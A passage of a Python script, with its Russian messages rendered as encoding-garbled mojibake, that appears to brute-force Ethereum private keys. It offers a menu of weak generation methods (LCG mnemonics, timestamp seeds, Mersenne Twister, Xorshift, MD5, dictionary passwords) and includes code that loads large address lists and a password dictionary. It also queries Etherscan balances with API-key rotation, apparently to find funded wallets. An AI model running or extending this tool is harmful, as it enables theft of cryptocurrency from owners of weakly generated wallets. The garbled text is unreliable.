                    logger.warning(f"–õ–∏–º–∏—Ç –∏–ª–∏ –æ—à–∏–±–∫–∞ –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏–∏ Etherscan –∫–ª—é—á–∞ {key_id} (–±–∞–ª–∞–Ω—Å): '{error_msg}', Retry-After: {retry_after}")
                    state['active'] = False
                    state['limit_reached_time'] = datetime.datetime.now()
                    state['temp_pauses'].append(datetime.datetime.now())
                    if check_temp_pauses(key_id):
                        return None
                    if any(keyword in error_msg for keyword in ['max rate limit', 'exceeded', 'rate limit', 'notok']):
                        wait_time = time_until_midnight_utc()
                        state['limit_reached_time'] += datetime.timedelta(seconds=wait_time)
                        print(Fore.YELLOW + f"–î–Ω–µ–≤–Ω–æ–π –ª–∏–º–∏—Ç Etherscan –∫–ª—é—á–∞ {key_id} (–±–∞–ª–∞–Ω—Å) ('{error_msg}'). –û—Ç–∫–ª—é—á–µ–Ω–∏–µ –¥–æ –ø–æ–ª—É–Ω–æ—á–∏ UTC." + Style.RESET_ALL)
                        logger.debug(f"Etherscan –∫–ª—é—á {key_id}: –æ—Ç–∫–ª—é—á—ë–Ω –¥–æ –ø–æ–ª—É–Ω–æ—á–∏ UTC: {wait_time} —Å–µ–∫")
                    else:
                        if retry_after:
                            try:
                                retry_after = int(retry_after)
                                retry_after = max(retry_after, MIN_RETRY_AFTER)
                                state['limit_reached_time'] += datetime.timedelta(seconds=retry_after)
                                logger.debug(f"Etherscan –∫–ª—é—á {key_id} Retry-After (–±–∞–ª–∞–Ω—Å): {retry_after} —Å–µ–∫")
                            except ValueError:
                                state['limit_reached_time'] += datetime.timedelta(seconds=MAX_API_TIMEOUT)
                                logger.debug(f"Etherscan –∫–ª—é—á {key_id}: –ø–∞—É–∑–∞ –Ω–∞ {MAX_API_TIMEOUT} —Å–µ–∫")
                        else:
                            state['limit_reached_time'] += datetime.timedelta(seconds=MAX_API_TIMEOUT)
                            logger.debug(f"Etherscan –∫–ª—é—á {key_id}: –ø–∞—É–∑–∞ –Ω–∞ {MAX_API_TIMEOUT} —Å–µ–∫")
                        print(Fore.YELLOW + f"–í—Ä–µ–º–µ–Ω–Ω—ã–π –ª–∏–º–∏—Ç Etherscan –∫–ª—é—á–∞ {key_id} (–±–∞–ª–∞–Ω—Å) ('{error_msg}')." + Style.RESET_ALL)
                    return None
                else:
                    print(Fore.YELLOW + f"–û—à–∏–±–∫–∞ Etherscan –∫–ª—é—á–∞ {key_id} (–±–∞–ª–∞–Ω—Å) (–∫–æ–¥: {resp.status})." + Style.RESET_ALL)
                    logger.warning(f"–û—à–∏–±–∫–∞ Etherscan –∫–ª—é—á–∞ {key_id} (–±–∞–ª–∞–Ω—Å): –∫–æ–¥ {resp.status}, –æ—Ç–≤–µ—Ç: {response_text}")
                    state['active'] = False
                    state['limit_reached_time'] = datetime.datetime.now()
                    state['temp_pauses'].append(datetime.datetime.now())
                    if check_temp_pauses(key_id):
                        return None
                    state['limit_reached_time'] += datetime.timedelta(seconds=MAX_API_TIMEOUT)
                    logger.debug(f"Etherscan –∫–ª—é—á {key_id}: –ø–∞—É–∑–∞ –Ω–∞ {MAX_API_TIMEOUT} —Å–µ–∫")
                    return None
        except (aiohttp.ClientError, asyncio.TimeoutError) as e:
            print(Fore.YELLOW + f"–°–µ—Ç–µ–≤–∞—è –æ—à–∏–±–∫–∞ Etherscan –∫–ª—é—á–∞ {key_id} (–±–∞–ª–∞–Ω—Å): {e}." + Style.RESET_ALL)
            logger.error(f"–°–µ—Ç–µ–≤–∞—è –æ—à–∏–±–∫–∞ Etherscan –∫–ª—é—á–∞ {key_id} (–±–∞–ª–∞–Ω—Å): {e}")
            state['active'] = False
            state['limit_reached_time'] = datetime.datetime.now()
            state['temp_pauses'].append(datetime.datetime.now())
            if check_temp_pauses(key_id):
                return None
            state['limit_reached_time'] += datetime.timedelta(seconds=MAX_API_TIMEOUT)
            logger.debug(f"Etherscan –∫–ª—é—á {key_id}: –ø–∞—É–∑–∞ –Ω–∞ {MAX_API_TIMEOUT} —Å–µ–∫")
            return None
    
# –ó–∞–≥—Ä—É–∑–∫–∞ –∞–¥—Ä–µ—Å–æ–≤ –≤ –ø–∞–º—è—Ç—å
async def load_addresses_to_memory(file_paths):
    logger.info(f"–ù–∞—á–∞–ª–æ –∑–∞–≥—Ä—É–∑–∫–∏ —Ñ–∞–π–ª–æ–≤ {file_paths} –≤ –ø–∞–º—è—Ç—å")
    addresses = set()
    start_time = datetime.datetime.now()
    total_size = 0
    for file_path in file_paths:
        file_size = os.path.getsize(file_path) / (1024 * 1024)
        total_size += file_size
        if file_size > 500:
            print(Fore.YELLOW + f"–§–∞–π–ª {file_path} ({file_size:.2f} –ú–ë) –¥–æ–≤–æ–ª—å–Ω–æ –±–æ–ª—å—à–æ–π." + Style.RESET_ALL)
            confirm = input(Fore.YELLOW + "–ü—Ä–æ–¥–æ–ª–∂–∏—Ç—å –∑–∞–≥—Ä—É–∑–∫—É? (y/n): " + Style.RESET_ALL).lower()
            if confirm != 'y':
                print(Fore.RED + f"–ó–∞–≥—Ä—É–∑–∫–∞ —Ñ–∞–π–ª–∞ {file_path} –æ—Ç–º–µ–Ω–µ–Ω–∞." + Style.RESET_ALL)
                logger.error(f"–ó–∞–≥—Ä—É–∑–∫–∞ —Ñ–∞–π–ª–∞ {file_path} –æ—Ç–º–µ–Ω–µ–Ω–∞ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–º.")
                exit(1)
    
    print(Fore.CYAN + f"–ó–∞–≥—Ä—É–∑–∫–∞ {len(file_paths)} —Ñ–∞–π–ª–∞(–æ–≤) ({total_size:.2f} –ú–ë)..." + Style.RESET_ALL)
    
    for file_path in file_paths:
        file_size = os.path.getsize(file_path)
        invalid_lines = 0
        lines_processed = 0
        try:
            with tqdm.tqdm(total=file_size, desc=f"Loading {os.path.basename(file_path)}", unit="B", unit_scale=True) as file_progress:
                with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                    for line in f:
                        line = line.strip()
                        if not line:
                            invalid_lines += 1
                            continue
                        lines_processed += 1
                        addresses.add(line.lower())
                        if lines_processed % 1000 == 0:
                            file_progress.update(sum(len(l.encode('utf-8')) + 1 for l in f.buffer.peek(1000).decode('utf-8', errors='ignore').splitlines()))
        except (FileNotFoundError, PermissionError) as e:
            print(Fore.RED + f"–û—à–∏–±–∫–∞ –ø—Ä–∏ —á—Ç–µ–Ω–∏–∏ —Ñ–∞–π–ª–∞ {file_path}: {e}" + Style.RESET_ALL)
            logger.error(f"–û—à–∏–±–∫–∞ –ø—Ä–∏ —á—Ç–µ–Ω–∏–∏ —Ñ–∞–π–ª–∞ {file_path}: {e}")
            exit(1)
        
        if invalid_lines > 0:
            print(Fore.YELLOW + f"–ü—Ä–æ–ø—É—â–µ–Ω–æ {invalid_lines} –ø—É—Å—Ç—ã—Ö —Å—Ç—Ä–æ–∫ –≤ {file_path}." + Style.RESET_ALL)
    
    elapsed_time = (datetime.datetime.now() - start_time).total_seconds()
    print(Fore.GREEN + f"–ó–∞–≥—Ä—É–∂–µ–Ω–æ {len(addresses)} –∞–¥—Ä–µ—Å–æ–≤ –∑–∞ {elapsed_time:.2f} —Å–µ–∫—É–Ω–¥." + Style.RESET_ALL)
    logger.info(f"–ó–∞–≤–µ—Ä—à–µ–Ω–∞ –∑–∞–≥—Ä—É–∑–∫–∞ {len(addresses)} –∞–¥—Ä–µ—Å–æ–≤ –∑–∞ {elapsed_time:.2f} —Å–µ–∫—É–Ω–¥")
    return addresses

# –ó–∞–≥—Ä—É–∑–∫–∞ –ø–∞—Ä–æ–ª–µ–π –¥–ª—è –º–µ—Ç–æ–¥–∞ 9
def load_password_dictionary(file_path):
    if not os.path.exists(file_path):
        print(Fore.RED + f"–§–∞–π–ª {file_path} –Ω–µ –Ω–∞–π–¥–µ–Ω." + Style.RESET_ALL)
        logger.error(f"–§–∞–π–ª –ø–∞—Ä–æ–ª–µ–π {file_path} –Ω–µ –Ω–∞–π–¥–µ–Ω.")
        return []
    try:
        with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
            passwords = [line.strip() for line in f if line.strip()]
        print(Fore.GREEN + f"–ó–∞–≥—Ä—É–∂–µ–Ω–æ {len(passwords)} –ø–∞—Ä–æ–ª–µ–π –∏–∑ {file_path}" + Style.RESET_ALL)
        logger.info(f"–ó–∞–≥—Ä—É–∂–µ–Ω–æ {len(passwords)} –ø–∞—Ä–æ–ª–µ–π –∏–∑ {file_path}")
        return passwords
    except Exception as e:
        print(Fore.RED + f"–û—à–∏–±–∫–∞ –ø—Ä–∏ —á—Ç–µ–Ω–∏–∏ —Ñ–∞–π–ª–∞ {file_path}: {e}" + Style.RESET_ALL)
        logger.error(f"–û—à–∏–±–∫–∞ –ø—Ä–∏ —á—Ç–µ–Ω–∏–∏ –ø–∞—Ä–æ–ª–µ–π {file_path}: {e}")
        return []

# –ò–Ω—Ç–µ—Ä—Ñ–µ–π—Å –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è
def choose_vanity_pattern():
    print(Fore.CYAN + "–í—ã–±–µ—Ä–∏—Ç–µ —à–∞–±–ª–æ–Ω –¥–ª—è Vanity-–∞–¥—Ä–µ—Å–∞:" + Style.RESET_ALL)
    while True:
        prefix = input(Fore.CYAN + "–í–≤–µ–¥–∏—Ç–µ –ø—Ä–µ—Ñ–∏–∫—Å (A-F,0-9, –¥–æ 4 —Å–∏–º–≤–æ–ª–æ–≤, –Ω–∞–ø—Ä–∏–º–µ—Ä, 0xABDC): " + Style.RESET_ALL)
        if re.match(r'^(0x)?[a-fA-F0-9]{0,4}$', prefix):
            if prefix and not prefix.startswith('0x'):
                prefix = '0x' + prefix
            break
        print(Fore.RED + "–û—à–∏–±–∫–∞: –ø—Ä–µ—Ñ–∏–∫—Å –¥–æ–ª–∂–µ–Ω —Å–æ–¥–µ—Ä–∂–∞—Ç—å 0-9, a-f, –¥–æ 4 —Å–∏–º–≤–æ–ª–æ–≤." + Style.RESET_ALL)
    while True:
        suffix = input(Fore.CYAN + "–í–≤–µ–¥–∏—Ç–µ —Å—É—Ñ—Ñ–∏–∫—Å (A-F,0-9, –¥–æ 4 —Å–∏–º–≤–æ–ª–æ–≤, –Ω–∞–ø—Ä–∏–º–µ—Ä, ABDC): " + Style.RESET_ALL)
        if re.match(r'^[a-fA-F0-9]{0,4}$', suffix):
            break
        print(Fore.RED + "–û—à–∏–±–∫–∞: —Å—É—Ñ—Ñ–∏–∫—Å –¥–æ–ª–∂–µ–Ω —Å–æ–¥–µ—Ä–∂–∞—Ç—å 0-9, a-f, –¥–æ 4 —Å–∏–º–≤–æ–ª–æ–≤." + Style.RESET_ALL)
    if not prefix and not suffix:
        print(Fore.RED + "–£–∫–∞–∂–∏—Ç–µ —Ö–æ—Ç—è –±—ã –ø—Ä–µ—Ñ–∏–∫—Å –∏–ª–∏ —Å—É—Ñ—Ñ–∏–∫—Å." + Style.RESET_ALL)
        return choose_vanity_pattern()
    return prefix, suffix

def choose_generation_method():
    while True:
        print(Fore.CYAN + "–í—ã–±–µ—Ä–∏—Ç–µ –º–µ—Ç–æ–¥ –≥–µ–Ω–µ—Ä–∞—Ü–∏–∏:" + Style.RESET_ALL)
        print(Fore.CYAN + "1. –°—Ç–∞–Ω–¥–∞—Ä—Ç–Ω–∞—è –≥–µ–Ω–µ—Ä–∞—Ü–∏—è" + Style.RESET_ALL)
        print(Fore.RED + "   [–£—è–∑–≤–∏–º–æ—Å—Ç—å: –û—Ç—Å—É—Ç—Å—Ç–≤—É–µ—Ç (–∫—Ä–∏–ø—Ç–æ–≥—Ä–∞—Ñ–∏—á–µ—Å–∫–∏ –±–µ–∑–æ–ø–∞—Å–Ω–æ)]" + Style.RESET_ALL + "\n" +
              Fore.GREEN + "   –û–ø–∏—Å–∞–Ω–∏–µ: –ì–µ–Ω–µ—Ä–∏—Ä—É–µ—Ç 32 —Å–ª—É—á–∞–π–Ω—ã—Ö –±–∞–π—Ç–∞ —Å –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ–º –∫—Ä–∏–ø—Ç–æ–≥—Ä–∞—Ñ–∏—á–µ—Å–∫–∏\n"
                           "   –±–µ–∑–æ–ø–∞—Å–Ω–æ–≥–æ –≥–µ–Ω–µ—Ä–∞—Ç–æ—Ä–∞ (os.urandom), –ø–æ—Å–ª–µ —á–µ–≥–æ —Ö—ç—à–∏—Ä—É–µ—Ç –∏—Ö —Å –ø–æ–º–æ—â—å—é\n"
                           "   Keccak-256 –¥–ª—è —Å–æ–∑–¥–∞–Ω–∏—è –ø—Ä–∏–≤–∞—Ç–Ω–æ–≥–æ –∫–ª—é—á–∞. –ú–µ—Ç–æ–¥ –±–µ–∑–æ–ø–∞—Å–µ–Ω –∏ —Å–æ–æ—Ç–≤–µ—Ç—Å—Ç–≤—É–µ—Ç\n"
                           "   —Å—Ç–∞–Ω–¥–∞—Ä—Ç–∞–º Ethereum." + Style.RESET_ALL)
        print(Fore.CYAN + "2. –ë—Ä—É—Ç—Ñ–æ—Ä—Å Vanity-–∞–¥—Ä–µ—Å–æ–≤" + Style.RESET_ALL)
        print(Fore.RED + "   [–£—è–∑–≤–∏–º–æ—Å—Ç—å: –°—Ä–µ–¥–Ω—è—è (–∑–∞–≤–∏—Å–∏—Ç –æ—Ç –¥–ª–∏–Ω—ã —à–∞–±–ª–æ–Ω–∞)]" + Style.RESET_ALL + "\n" +
              Fore.GREEN + "   –û–ø–∏—Å–∞–Ω–∏–µ: –ì–µ–Ω–µ—Ä–∏—Ä—É–µ—Ç –ø—Ä–∏–≤–∞—Ç–Ω—ã–µ –∫–ª—é—á–∏ –¥–æ —Ç–µ—Ö –ø–æ—Ä, –ø–æ–∫–∞ —Å–æ–æ—Ç–≤–µ—Ç—Å—Ç–≤—É—é—â–∏–π\n"
                           "   –∞–¥—Ä–µ—Å –Ω–µ –±—É–¥–µ—Ç –Ω–∞—á–∏–Ω–∞—Ç—å—Å—è –∏–ª–∏ –∑–∞–∫–∞–Ω—á–∏–≤–∞—Ç—å—Å—è –∑–∞–¥–∞–Ω–Ω—ã–º —à–∞–±–ª–æ–Ω–æ–º (–ø—Ä–µ—Ñ–∏–∫—Å\n"
                           "   –∏–ª–∏ —Å—É—Ñ—Ñ–∏–∫—Å –¥–æ 4 —Å–∏–º–≤–æ–ª–æ–≤, –Ω–∞–ø—Ä–∏–º–µ—Ä, 0xABDC). –ü–æ–¥—Ö–æ–¥–∏—Ç –¥–ª—è —Å–æ–∑–¥–∞–Ω–∏—è\n"
                           "   –ø–µ—Ä—Å–æ–Ω–∞–ª–∏–∑–∏—Ä–æ–≤–∞–Ω–Ω—ã—Ö –∞–¥—Ä–µ—Å–æ–≤, –Ω–æ —Ç—Ä–µ–±—É–µ—Ç –∑–Ω–∞—á–∏—Ç–µ–ª—å–Ω—ã—Ö –≤—ã—á–∏—Å–ª–µ–Ω–∏–π –¥–ª—è\n"
                           "   –¥–ª–∏–Ω–Ω—ã—Ö —à–∞–±–ª–æ–Ω–æ–≤." + Style.RESET_ALL)
        print(Fore.CYAN + "3. –ì–µ–Ω–µ—Ä–∞—Ü–∏—è –≤ –ø—Ä–µ–¥–µ–ª–∞—Ö –≥—Ä—É–ø–ø—ã (A,B,C,D,E,F,G,H)" + Style.RESET_ALL)
        print(Fore.RED + "   [–£—è–∑–≤–∏–º–æ—Å—Ç—å: –°—Ä–µ–¥–Ω—è—è]" + Style.RESET_ALL + "\n" +
              Fore.GREEN + "   –û–ø–∏—Å–∞–Ω–∏–µ: –°–æ–∑–¥–∞—ë—Ç –ø—Ä–∏–≤–∞—Ç–Ω—ã–µ –∫–ª—é—á–∏ –≤ –∑–∞–¥–∞–Ω–Ω—ã—Ö —á–∏—Å–ª–æ–≤—ã—Ö –¥–∏–∞–ø–∞–∑–æ–Ω–∞—Ö\n"
                           "   (–≥—Ä—É–ø–ø—ã A-H), –æ–ø—Ä–µ–¥–µ–ª—ë–Ω–Ω—ã—Ö –∑–∞—Ä–∞–Ω–µ–µ. –ö–∞–∂–¥–∞—è –≥—Ä—É–ø–ø–∞ –ø—Ä–µ–¥—Å—Ç–∞–≤–ª—è–µ—Ç –∏–Ω—Ç–µ—Ä–≤–∞–ª\n"
                           "   —á–∏—Å–µ–ª, –∏–∑ –∫–æ—Ç–æ—Ä—ã—Ö –≤—ã–±–∏—Ä–∞–µ—Ç—Å—è —Å–ª—É—á–∞–π–Ω–æ–µ –∑–Ω–∞—á–µ–Ω–∏–µ, —Ö—ç—à–∏—Ä—É–µ–º–æ–µ –¥–ª—è –ø–æ–ª—É—á–µ–Ω–∏—è\n"
                           "   –∫–ª—é—á–∞. –ò—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è –¥–ª—è —Ç–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏—è –∏–ª–∏ —Å–ø–µ—Ü–∏—Ñ–∏—á–µ—Å–∫–∏—Ö —Å—Ü–µ–Ω–∞—Ä–∏–µ–≤." + Style.RESET_ALL)
        print(Fore.CYAN + "4. –ú–Ω–µ–º–æ–Ω–∏—á–µ—Å–∫–∏–µ —Ñ—Ä–∞–∑—ã —Å–æ —Å–ª–∞–±—ã–º RNG + –≥–µ–Ω–µ—Ä–∞—Ü–∏—è –∏–∑ —Ñ–∞–π–ª–∞" + Style.RESET_ALL)
        print(Fore.RED + "   [–£—è–∑–≤–∏–º–æ—Å—Ç—å: –í—ã—Å–æ–∫–∞—è]" + Style.RESET_ALL + "\n" +
              Fore.GREEN + "   –û–ø–∏—Å–∞–Ω–∏–µ: –ì–µ–Ω–µ—Ä–∏—Ä—É–µ—Ç –º–Ω–µ–º–æ–Ω–∏—á–µ—Å–∫—É—é —Ñ—Ä–∞–∑—É (BIP-39) —Å –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ–º\n"
                           "   –ª–∏–Ω–µ–π–Ω–æ–≥–æ –∫–æ–Ω–≥—Ä—É—ç–Ω—Ç–Ω–æ–≥–æ –≥–µ–Ω–µ—Ä–∞—Ç–æ—Ä–∞ (LCG) –≤–º–µ—Å—Ç–æ –∫—Ä–∏–ø—Ç–æ–≥—Ä–∞—Ñ–∏—á–µ—Å–∫–∏\n"
                           "   –±–µ–∑–æ–ø–∞—Å–Ω–æ–≥–æ RNG. LCG –∏–º–µ–µ—Ç –Ω–∏–∑–∫—É—é —ç–Ω—Ç—Ä–æ–ø–∏—é (~32 –±–∏—Ç–∞), —á—Ç–æ –¥–µ–ª–∞–µ—Ç\n"
                           "   —Ñ—Ä–∞–∑—É –ø—Ä–µ–¥—Å–∫–∞–∑—É–µ–º–æ–π. –§—Ä–∞–∑–∞ –ø—Ä–µ–æ–±—Ä–∞–∑—É–µ—Ç—Å—è –≤ seed –∏ –∑–∞—Ç–µ–º –≤ –∫–ª—é—á\n"
                           "   —á–µ—Ä–µ–∑ Keccak-256. –õ–∏–±–æ –≥–µ–Ω–µ—Ä–∞—Ü–∏—è SEED –Ω–∞ –æ—Å–Ω–æ–≤–∞–Ω–∏–∏ —Å–ª–æ–≤ –≤ —Å–ª–æ–≤–∞—Ä–µ." + Style.RESET_ALL)
        print(Fore.CYAN + "5. –£—è–∑–≤–∏–º—ã–µ –∫–æ–º–±–∏–Ω–∏—Ä–æ–≤–∞–Ω–Ω—ã–µ –∫–ª—é—á–∏" + Style.RESET_ALL)
        print(Fore.RED + "   [–£—è–∑–≤–∏–º–æ—Å—Ç—å: –í—ã—Å–æ–∫–∞—è]" + Style.RESET_ALL + "\n" +
              Fore.GREEN + "   –û–ø–∏—Å–∞–Ω–∏–µ: –ì–µ–Ω–µ—Ä–∏—Ä—É–µ—Ç –∫–ª—é—á–∏ —Å –ø—Ä–µ–¥—Å–∫–∞–∑—É–µ–º—ã–º–∏ –ø–∞—Ç—Ç–µ—Ä–Ω–∞–º–∏: –ø–æ–≤—Ç–æ—Ä—è—é—â–∏–µ—Å—è\n"
                           "   —Å–∏–º–≤–æ–ª—ã (–Ω–∞–ø—Ä–∏–º–µ—Ä, 0xAA –ø–æ–≤—Ç–æ—Ä—è–µ—Ç—Å—è), –ø–æ–ª—É—Å–ª—É—á–∞–π–Ω—ã–µ –ø–æ—Å–ª–µ–¥–æ–≤–∞—Ç–µ–ª—å–Ω–æ—Å—Ç–∏\n"
                           "   (—á–∞—Å—Ç—å –±–∞–π—Ç–æ–≤ —Å–ª—É—á–∞–π–Ω–∞, —á–∞—Å—Ç—å —Ñ–∏–∫—Å–∏—Ä–æ–≤–∞–Ω–∞) –∏–ª–∏ —É—è–∑–≤–∏–º—ã–µ –ø–∞—Ç—Ç–µ—Ä–Ω—ã\n"
                           "   (–Ω–∞–ø—Ä–∏–º–µ—Ä, 0xDEADBEEF). –•—ç—à–∏—Ä—É–µ—Ç—Å—è —á–µ—Ä–µ–∑ Keccak-256." + Style.RESET_ALL)
        print(Fore.CYAN + "6. –ö–ª—é—á–∏ –Ω–∞ –æ—Å–Ω–æ–≤–µ –≤—Ä–µ–º–µ–Ω–∏" + Style.RESET_ALL)
        print(Fore.RED + "   [–£—è–∑–≤–∏–º–æ—Å—Ç—å: –í—ã—Å–æ–∫–∞—è]" + Style.RESET_ALL + "\n" +
              Fore.GREEN + "   –û–ø–∏—Å–∞–Ω–∏–µ: –ò—Å–ø–æ–ª—å–∑—É–µ—Ç –≤—Ä–µ–º–µ–Ω–Ω—ã–µ –º–µ—Ç–∫–∏ (timestamp) –∫–∞–∫ –≤—Ö–æ–¥–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ,\n"
                           "   –ø—Ä–µ–æ–±—Ä–∞–∑—É—è –∏—Ö –≤ 32-–±–∞–π—Ç–Ω–æ–µ –∑–Ω–∞—á–µ–Ω–∏–µ –∏ —Ö—ç—à–∏—Ä—É—è —á–µ—Ä–µ–∑ Keccak-256 –¥–ª—è\n"
                           "   —Å–æ–∑–¥–∞–Ω–∏—è –∫–ª—é—á–∞. –ú–æ–∂–µ—Ç –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å —Ç–µ–∫—É—â—É—é –∏–ª–∏ –∑–∞–¥–∞–Ω–Ω—É—é –¥–∞—Ç—É, —á—Ç–æ\n"
                           "   –¥–µ–ª–∞–µ—Ç –∫–ª—é—á–∏ –ø—Ä–µ–¥—Å–∫–∞–∑—É–µ–º—ã. –ü–µ—Ä–µ–±–∏—Ä–∞–µ—Ç –∑–Ω–∞–µ–Ω–∏—è –∫—Ä–∞—Ç–Ω–æ —Å–µ–∫—É–Ω–¥–µ –≤\n"
                           "   –æ–±—Ä–∞—Ç–Ω–æ–º –ø–æ—Ä—è–¥–∫–µ –æ—Ç –∑–∞–¥–∞–Ω–Ω–æ–π –¥–∞—Ç—ã." + Style.RESET_ALL)
        print(Fore.CYAN + "7. –ö–ª—é—á–∏ —á–µ—Ä–µ–∑ Mersenne Twister" + Style.RESET_ALL)
        print(Fore.RED + "   [–£—è–∑–≤–∏–º–æ—Å—Ç—å: –í—ã—Å–æ–∫–∞—è]" + Style.RESET_ALL + "\n" +
              Fore.GREEN + "   –û–ø–∏—Å–∞–Ω–∏–µ: –ì–µ–Ω–µ—Ä–∏—Ä—É–µ—Ç 32 –±–∞–π—Ç–∞ —Å –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ–º –≥–µ–Ω–µ—Ä–∞—Ç–æ—Ä–∞ –ø—Å–µ–≤–¥–æ—Å–ª—É—á–∞–π–Ω—ã—Ö\n"
                           "   —á–∏—Å–µ–ª Mersenne Twister (MT19937), –∏–Ω–∏—Ü–∏–∞–ª–∏–∑–∏—Ä–æ–≤–∞–Ω–Ω–æ–≥–æ –≤—Ä–µ–º–µ–Ω–Ω–æ–π –º–µ—Ç–∫–æ–π.\n"
                           "   –ü–æ–ª—É—á–µ–Ω–Ω—ã–µ –±–∞–π—Ç—ã —Ö—ç—à–∏—Ä—É—é—Ç—Å—è —á–µ—Ä–µ–∑ Keccak-256. MT19937 –ø—Ä–µ–¥—Å–∫–∞–∑—É–µ–º\n"
                           "   –ø—Ä–∏ –∏–∑–≤–µ—Å—Ç–Ω–æ–º seed." + Style.RESET_ALL)
        print(Fore.CYAN + "8. –ö–æ–Ω–∫–∞—Ç–µ–Ω–∞—Ü–∏—è —Å–ª–∞–±—ã—Ö –∏—Å—Ç–æ—á–Ω–∏–∫–æ–≤" + Style.RESET_ALL)
        print(Fore.RED + "   [–£—è–∑–≤–∏–º–æ—Å—Ç—å: –í—ã—Å–æ–∫–∞—è]" + Style.RESET_ALL + "\n" +
              Fore.GREEN + "   –û–ø–∏—Å–∞–Ω–∏–µ: –ö–æ–º–±–∏–Ω–∏—Ä—É–µ—Ç –Ω–µ—Å–∫–æ–ª—å–∫–æ –∏—Å—Ç–æ—á–Ω–∏–∫–æ–≤ –Ω–∏–∑–∫–æ–π —ç–Ω—Ç—Ä–æ–ø–∏–∏: –≤—Ä–µ–º–µ–Ω–Ω—É—é\n"
                           "   –º–µ—Ç–∫—É (8 –±–∞–π—Ç), –∏–¥–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ç–æ—Ä –ø—Ä–æ—Ü–µ—Å—Å–∞ (4 –±–∞–π—Ç–∞), —Å–ª—É—á–∞–π–Ω—ã–µ –±–∞–π—Ç—ã\n"
                           "   (8 –±–∞–π—Ç) –∏ —Ñ–∏–∫—Å–∏—Ä–æ–≤–∞–Ω–Ω—É—é –∫–æ–Ω—Å—Ç–∞–Ω—Ç—É (12 –±–∞–π—Ç). –†–µ–∑—É–ª—å—Ç–∞—Ç —Ö—ç—à–∏—Ä—É–µ—Ç—Å—è\n"
                           "   —á–µ—Ä–µ–∑ Keccak-256." + Style.RESET_ALL)
        print(Fore.CYAN + "9. –ö–ª—é—á–∏ –∏–∑ –ø–∞—Ä–æ–ª–µ–π" + Style.RESET_ALL)
        print(Fore.RED + "   [–£—è–∑–≤–∏–º–æ—Å—Ç—å: –í—ã—Å–æ–∫–∞—è]" + Style.RESET_ALL + "\n" +
              Fore.GREEN + "   –û–ø–∏—Å–∞–Ω–∏–µ: –•—ç—à–∏—Ä—É–µ—Ç –ø–∞—Ä–æ–ª—å (–∏–∑ —Ñ–∞–π–ª–∞ –∏–ª–∏ —Å–ª—É—á–∞–π–Ω—ã–π) —á–µ—Ä–µ–∑ Keccak-256\n"
                           "   –¥–ª—è —Å–æ–∑–¥–∞–Ω–∏—è –ø—Ä–∏–≤–∞—Ç–Ω–æ–≥–æ –∫–ª—é—á–∞. –ü–∞—Ä–æ–ª–∏ –æ–±—ã—á–Ω–æ –∏–º–µ—é—Ç –Ω–∏–∑–∫—É—é —ç–Ω—Ç—Ä–æ–ø–∏—é,\n"
                           "   –æ—Å–æ–±–µ–Ω–Ω–æ –µ—Å–ª–∏ –≤–∑—è—Ç—ã –∏–∑ —Å–ª–æ–≤–∞—Ä—è." + Style.RESET_ALL)
        print(Fore.CYAN + "10. –ö–ª—é—á–∏ —á–µ—Ä–µ–∑ —É—Å—Ç–∞—Ä–µ–≤—à–∏–µ —Ö—ç—à-—Ñ—É–Ω–∫—Ü–∏–∏ (MD5)" + Style.RESET_ALL)
        print(Fore.RED + "   [–£—è–∑–≤–∏–º–æ—Å—Ç—å: –í—ã—Å–æ–∫–∞—è]" + Style.RESET_ALL + "\n" +
              Fore.GREEN + "   –û–ø–∏—Å–∞–Ω–∏–µ: –ì–µ–Ω–µ—Ä–∏—Ä—É–µ—Ç –∫–ª—é—á, —Ö—ç—à–∏—Ä—É—è —Å–ª—É—á–∞–π–Ω—ã–π —Å—á—ë—Ç—á–∏–∫ —Å –ø–æ–º–æ—â—å—é MD5\n"
                           "   (16 –±–∞–π—Ç), —É–¥–≤–∞–∏–≤–∞—è —Ä–µ–∑—É–ª—å—Ç–∞—Ç –¥–æ 32 –±–∞–π—Ç –∏ —Ö—ç—à–∏—Ä—É—è —á–µ—Ä–µ–∑ Keccak-256.\n"
                           "   MD5 —É—Å—Ç–∞—Ä–µ–ª –∏ –∏–º–µ–µ—Ç –Ω–∏–∑–∫—É—é –∫—Ä–∏–ø—Ç–æ–≥—Ä–∞—Ñ–∏—á–µ—Å–∫—É—é —Å—Ç–æ–π–∫–æ—Å—Ç—å." + Style.RESET_ALL)
        print(Fore.CYAN + "11. –ü—Å–µ–≤–¥–æ—Å–ª—É—á–∞–π–Ω—ã–µ –ø–æ—Å–ª–µ–¥–æ–≤–∞—Ç–µ–ª—å–Ω–æ—Å—Ç–∏ (Xorshift)" + Style.RESET_ALL)
        print(Fore.RED + "   [–£—è–∑–≤–∏–º–æ—Å—Ç—å: –í—ã—Å–æ–∫–∞—è]" + Style.RESET_ALL + "\n" +
              Fore.GREEN + "   –û–ø–∏—Å–∞–Ω–∏–µ: –ò—Å–ø–æ–ª—å–∑—É–µ—Ç –∞–ª–≥–æ—Ä–∏—Ç–º Xorshift128+ —Å seed –Ω–∞ –æ—Å–Ω–æ–≤–µ –≤—Ä–µ–º–µ–Ω–Ω–æ–π\n"
                           "   –º–µ—Ç–∫–∏ –¥–ª—è –≥–µ–Ω–µ—Ä–∞—Ü–∏–∏ 32 –±–∞–π—Ç. –ü–æ–ª—É—á–µ–Ω–Ω—ã–µ –±–∞–π—Ç—ã —Ö—ç—à–∏—Ä—É—é—Ç—Å—è —á–µ—Ä–µ–∑\n"
                           "   Keccak-256. Xorshift –∏–º–µ–µ—Ç –Ω–∏–∑–∫—É—é —ç–Ω—Ç—Ä–æ–ø–∏—é –∏ –ø—Ä–µ–¥—Å–∫–∞–∑—É–µ–º\n"
                           "   –ø—Ä–∏ –∏–∑–≤–µ—Å—Ç–Ω–æ–º seed." + Style.RESET_ALL)
